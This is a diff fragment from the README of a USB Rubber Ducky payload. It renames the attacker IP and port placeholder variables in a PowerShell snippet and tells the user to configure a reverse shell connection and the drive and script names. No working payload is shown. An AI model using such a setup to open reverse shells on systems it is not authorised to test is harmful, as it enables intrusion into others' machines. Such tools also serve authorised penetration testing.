@@ -29,8 +29,8 @@ This payload is intended for use with a USB Rubber Ducky device.
    Edit the powershell script to set your attacker's IP address and port for the reverse shell connection:
    
    ```powershell
-   $ip = 'YOUR_IP'
-   $port = 'YOUR_PORT'
+   $IP = 'YOUR_IP'
+   $PORT = 'YOUR_PORT'
 
 3. **Configure drive and powershell script name **:
    edit the payload.txt to set both the name of the drive label and the powershell script
